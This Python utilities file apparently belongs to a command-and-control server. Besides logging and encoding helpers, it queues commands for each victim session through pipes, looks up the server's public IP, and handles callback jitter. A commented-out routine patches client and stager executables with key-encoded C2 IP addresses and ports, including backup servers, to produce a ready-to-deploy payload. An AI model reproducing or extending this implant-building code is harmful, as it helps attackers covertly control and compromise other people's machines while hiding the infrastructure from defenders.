from __future__ import annotations

from datetime import timedelta
from typing import AsyncGenerator, NamedTuple
from datetime import datetime
from os.path import exists
from termcolor import colored
from time import sleep
import os, requests, inspect, ipaddress

# from packages.consts import sum_key, satger_sum_key
from packages import vars

# # start input dialog adding history
# from typing import Any
# from prompt_toolkit.application import Application
# from prompt_toolkit.application.current import get_app
# from prompt_toolkit.buffer import Buffer
# from prompt_toolkit.completion import Completer
# from prompt_toolkit.filters import FilterOrBool
# from prompt_toolkit.formatted_text import AnyFormattedText
# from prompt_toolkit.key_binding.bindings.focus import focus_next, focus_previous
# from prompt_toolkit.key_binding.defaults import load_key_bindings
# from prompt_toolkit.key_binding.key_bindings import KeyBindings, merge_key_bindings
# from prompt_toolkit.layout import Layout
# from prompt_toolkit.layout.containers import AnyContainer, HSplit
# from prompt_toolkit.layout.dimension import Dimension as D
# from prompt_toolkit.styles import BaseStyle
# from prompt_toolkit.validation import Validator
# from prompt_toolkit.widgets import (Button,Dialog,Label,TextArea,ValidationToolbar,)

# def _return_none() -> None:
#     "Button handler that returns None."
#     get_app().exit()

# def _create_app(dialog: AnyContainer, style: BaseStyle | None) -> Application[Any]:
#     # Key bindings.
#     bindings = KeyBindings()
#     bindings.add("tab")(focus_next)
#     bindings.add("s-tab")(focus_previous)

#     return Application(
#         layout=Layout(dialog),
#         key_bindings=merge_key_bindings([load_key_bindings(), bindings]),
#         mouse_support=True,
#         style=style,
#         full_screen=True,
#     )

# def input_dialog(
#     title: AnyFormattedText = "",
#     text: AnyFormattedText = "",
#     ok_text: str = "OK",
#     cancel_text: str = "Cancel",
#     completer: Completer | None = None,
#     validator: Validator | None = None,
#     password: FilterOrBool = False,
#     style: BaseStyle | None = None,
#     default: str = "",
#     history = None,
# ) -> Application[str]:
#     """
#     Display a text input box.
#     Return the given text, or None when cancelled.
#     """

#     def accept(buf: Buffer) -> bool:
#         get_app().layout.focus(ok_button)
#         return True  # Keep text.

#     def ok_handler() -> None:
#         get_app().exit(result=textfield.text)

#     ok_button = Button(text=ok_text, handler=ok_handler)
#     cancel_button = Button(text=cancel_text, handler=_return_none)

#     textfield = TextArea(
#         text=default,
#         multiline=False,
#         password=password,
#         completer=completer,
#         validator=validator,
#         accept_handler=accept,
#         history=history,
#     )

#     dialog = Dialog(
#         title=title,
#         body=HSplit(
#             [
#                 Label(text=text, dont_extend_height=True),
#                 textfield,
#                 ValidationToolbar(),
#             ],
#             padding=D(preferred=1, max=1),
#         ),
#         buttons=[ok_button, cancel_button],
#         with_background=True,
#     )

#     return _create_app(dialog, style)
# # end input dialog adding history

pyprint = print

def log_and_print(*values, sep = " ", end = "\n", color = None, on_color = None, attrs = None):
    stri = sep.join(map(str, values)) + end
    colored_stri = stri if color == None else colored(stri, color=color, on_color=on_color, attrs=attrs)
    pyprint(colored_stri, end='')
    # vars.logFile.write(stri)
    # vars.logFile.flush()

print = log_and_print

def convert_seconds(seconds):
    duration = timedelta(seconds=seconds)
    years = duration.days // 365
    months = (duration.days % 365) // 30
    days = (duration.days % 365) % 30
    hours = duration.seconds // 3600
    minutes = (duration.seconds % 3600) // 60
    seconds = (duration.seconds % 3600) % 60
    
    result = "" if years == 0 else str(years) + " years "
    result += "" if months == 0 else str(months) + " months "
    result += "" if days == 0 else str(days) + " days "
    result += "" if hours == 0 else str(hours) + " hours "
    result += "" if minutes == 0 else str(minutes) + " minutes "
    result += "" if seconds == 0 else str(seconds) + " seconds"
    return result if result != "" else "0 seconds"

def encode_m(data):
    try:
        return data.encode("utf-8")
    except:
        pass
    try:
        return data.encode("utf-16")
    except:
        pass
    try:
        return data.encode("latin-1")
    except:
        return data.encode("utf-8", errors="ignore")

def decode_m(data):
    try:
        return data.decode("utf-8")
    except:
        pass
    try:
        return data.decode("utf-16")
    except:
        pass
    try:
        return data.decode("latin-1")
    except:
        return data.decode("utf-8", errors="ignore")

def zero_remover(string):
    bytes = string.encode()
    is_unicode = False
    for i, byte in enumerate(bytes):
        if i % 2 == 1 and byte != 0:
            is_unicode = True
            break
    return string if is_unicode else string.replace('\x00', '')

# class FileHistory():
#     def __init__(self, filename: str) -> None:
#         self._loaded = False
#         self.filename = filename
#         self._loaded_strings: list[str] = []

#     async def load(self) -> AsyncGenerator[str, None]:
#         if not self._loaded:
#             self._loaded_strings = list(self.load_history_strings())
#             self._loaded = True

#         for item in self._loaded_strings:
#             yield item

#     def get_strings(self) -> list[str]:
#         return self._loaded_strings[::-1]

#     def append_string(self, string: str) -> None:
#         if string not in self._loaded_strings:
#             self.store_string(string)
#         if len(self._loaded_strings) == 0:
#             self._loaded_strings.insert(0, string)
#         if len(self._loaded_strings) > 0 and string != self._loaded_strings[0]:
#             self._loaded_strings.insert(0, string)
    
#     def load_history_strings(self):
#         strings: list[str] = []
#         lines: list[str] = []
#         def add() -> None:
#             if lines:
#                 string = "".join(lines)[:-1]
#                 strings.append(string)
#         if exists(self.filename):
#             with open(self.filename, "rb") as f:
#                 for line_bytes in f:
#                     line = line_bytes.decode("utf-8", errors="replace")
#                     if line.startswith("+"):
#                         lines.append(line[1:])
#                     else:
#                         add()
#                         lines = []
#                 add()
#         return list(reversed(strings))

#     def store_string(self, string: str) -> None:
#         with open(self.filename, "ab") as f:
#             def write(t: str) -> None:
#                 f.write(t.encode("utf-8"))
#             write("\n# %s\n" % datetime.now())
#             for line in string.split("\n"):
#                 write("+%s\n" % line)

class Address(NamedTuple):
    host: str
    port: int

def read_pipe(pipe, length):
    bytes_read_till_now, data = 0, b""
    while bytes_read_till_now < length:
        message = os.read(pipe, length - bytes_read_till_now)
        bytes_read_till_now += len(message)
        data += message
        sleep(0.001)
    return data

def write_pipe(pipe, data):
    bytes_written_till_now, length = 0, len(data)
    while bytes_written_till_now < length:
        bytes_written = os.write(pipe, data[bytes_written_till_now : ])
        bytes_written_till_now += bytes_written
        sleep(0.001)

def get_command(id):
    if len(vars.sessions[id]["command_sizes"]) > 0:
        data = read_pipe(vars.sessions[id]["read_pipe"], vars.sessions[id]["command_sizes"][0])
        vars.sessions[id]["command_sizes"].pop(0)
        return data
    return None

def add_command(id, command):
    command = command if type(command).__name__ == "bytes" else encode_m(command)
    vars.sessions[id]["command_sizes"].append(len(command))
    write_pipe(vars.sessions[id]["write_pipe"], command)

def clear_pipe(id):
    while get_command(id):
        pass

def get_ip_port(ip, port):
    if ip == '':
        if vars.SERVER_IP == '':
            try:
                response = requests.get('https://api.ipify.org?format=json')
                ip = response.json()['ip']
            except:
                print("\ncant connect to ipify to get public ip, please check network connection.\n", color='red')
                ip = '127.0.0.1'
        else:
            ip = vars.SERVER_IP
    if port == 0:
        if vars.SERVER_PORT == 0:
            port = 80
        else:
            port = vars.SERVER_PORT
    print("\nworking on " + str(ip) + " : " + str(port) + "\n", color='green')
    return ip, port

def get_min_and_max_sleep_time(sleep_time):
    base = int(sleep_time.split(' ± ')[0])
    tolerance = int(sleep_time.split(' ± ')[1])
    return base - tolerance, base + tolerance

def line_info():
    return str(inspect.stack()[1][1]) + " : " + str(inspect.stack()[1][2]) + " : " + str(inspect.stack()[1][3])

# def get_backup_servers(arg_backup, first_ip, first_port, default_file=False):
#     if arg_backup != '':
#         ips, ports = [first_ip], [first_port]
#         try:
#             with open(arg_backup, 'r') as f:
#                 for i, l in enumerate(f.readlines()):
#                     if l.strip() == '':
#                         continue
#                     if i == 19:
#                         print("backup servers applied successflly.\n", color='green')
#                         if not default_file:
#                             with open('packages/history/backup_servers.txt', 'w') as g:
#                                 for j in range(1, len(ips)):
#                                     g.write(ips[j].decode() + ':' + str(ports[j]) + '\n')
#                         return ips, ports
#                     if len(l.split(':')) != 2:
#                         print("invalid format in backup servers file. valid format is ip:port in each line.", color='red')
#                         return ips, ports
#                     try:
#                         ipaddress.ip_address(l.split(':')[0])
#                         port = int(l.split(':')[1].strip())
#                         if port < 0 or port > 65535:
#                             raise
#                         ips.append(l.split(':')[0].encode())
#                         ports.append(port)
#                     except:
#                         print("invalid format in backup servers file. valid format is ip:port in each line.", color='red')
#                         return ips, ports
#         except:
#             if not default_file:
#                 print("invalid address for backup servers file.", color='red')
#             return ips, ports
#         print("backup servers applied successflly.\n", color='green')
#         if not default_file:
#             with open('packages/history/backup_servers.txt', 'w') as g:
#                 for j in range(1, len(ips)):
#                     g.write(ips[j].decode() + ':' + str(ports[j]) + '\n')
#         return ips, ports
#     else:
#         return get_backup_servers('packages/history/backup_servers.txt', first_ip, first_port, default_file=True)

# def encode_bytes(bytes, sum_key):
#     rbytes = b""
#     for i, byte in enumerate(bytes):
#         rbytes += ((byte + sum_key[i % len(sum_key)]) % 256).to_bytes(1, byteorder="little")
#     return rbytes

# def find_byte_array_repetitions(main_array, sub_array):
#     count, finds = 0, []
#     for i in range(len(main_array) - len(sub_array) + 1):
#         if main_array[ i : i + len(sub_array) ] == sub_array:
#             count += 1
#             finds.append(i)
#     return count, finds

# def modify_exe(path, output_path, ips_to_search, port_to_search, number_of_server_to_search, new_ips, new_ports):
#     data_pe = b""
#     try:
#         with open(path, 'rb') as f:
#             data_pe = f.read()
#     except:
#         print("file", path, "not found.", color='red')
#         return
#     indexes_ips = []
#     for ip_to_search in ips_to_search:
#         count_ip, indexes_ip = find_byte_array_repetitions(data_pe, ip_to_search)
#         if count_ip != 1:
#             print('ip not found, or over found, so modifying client exe', path, 'failed. please place newly builded exe at clean client folder.', count_ip, color='red')
#             return
#         indexes_ips.append(indexes_ip[0])
    
#     count_port, indexes_ports = find_byte_array_repetitions(data_pe, port_to_search)
#     count_number_of_server, indexes_number_of_servers = find_byte_array_repetitions(data_pe, number_of_server_to_search)
    
#     if count_port != 20 or count_number_of_server != 1:
#         print('port or number_of_server not found, or over found, so modifying client exe', path, 'failed. please place newly builded exe at clean client folder.', count_port, count_number_of_server, color='red')
#         return
    
#     index_list = [(indexes_number_of_servers[0], len(new_ips).to_bytes(2, byteorder="little"))]
#     for i in range(len(new_ips)):
#         index_list.append((indexes_ips[i], new_ips[i]))
#         index_list.append((indexes_ports[i], new_ports[i]))
    
#     for ind in index_list:
#         data_pe = data_pe[:ind[0]] + ind[1] + data_pe[ind[0] + len(ind[1]):]
    
#     try:
#         with open(output_path, "wb") as f:
#             f.write(data_pe)
#     except:
#         print("the", output_path, "is running and is not modifiable\n", color='red')
#         return
#     if not output_path.startswith('packages'):
#         print('client exe generated successfully (', output_path, ')\n', sep='', color='green')

# def modify_client_exe(new_ips, new_ports):
#     num_to_search_1_cc = (55318).to_bytes(2, byteorder="little")
#     num_to_search_2_cc = (55320).to_bytes(2, byteorder="little")
#     num_to_search_1_stager = (55321).to_bytes(2, byteorder="little")
#     num_to_search_2_stager = (55319).to_bytes(2, byteorder="little")
#     ips_to_search, stager_ips_to_search = [], []
#     for i in range(99, 79, -1):
#         ips_to_search.append(encode_bytes(("999.999.999.99" + str(i)).encode(), sum_key))
#         stager_ips_to_search.append(encode_bytes(("999.999.999.99" + str(i)).encode(), satger_sum_key))
    
#     enc_ips_cc, enc_ips_stager, byte_ports = [], [], []
#     for new_ip, ip_to_search, stager_ip_to_search, new_port in zip(new_ips, ips_to_search, stager_ips_to_search, new_ports):
#         enc_ips_cc.append(encode_bytes(new_ip + (len(ip_to_search) - len(new_ip)) * b"\x00", sum_key))
#         enc_ips_stager.append(encode_bytes(new_ip + (len(stager_ip_to_search) - len(new_ip)) * b"\x00", satger_sum_key))
#         byte_ports.append(new_port.to_bytes(2, byteorder="little"))
    
#     modify_exe("packages/clean client/new cc.exe", "packages/clean client/CCWithIpPort_normal.exe", ips_to_search, num_to_search_1_cc, num_to_search_2_cc, enc_ips_cc, byte_ports)
#     modify_exe("packages/clean client/stager.exe", "ready.exe", stager_ips_to_search, num_to_search_1_stager, num_to_search_2_stager, enc_ips_stager, byte_ports)
#     # modify_exe("packages/clean client/new cc_macro.exe", "packages/clean client/CCWithIpPort_macro.exe", ips_to_search, num_to_search_1_cc, num_to_search_2_cc, enc_ips_cc, byte_ports)
#     # modify_exe("packages/clean client/stager_macro.exe", "ready (macro).exe", stager_ips_to_search, num_to_search_1_stager, num_to_search_2_stager, enc_ips_stager, byte_ports)
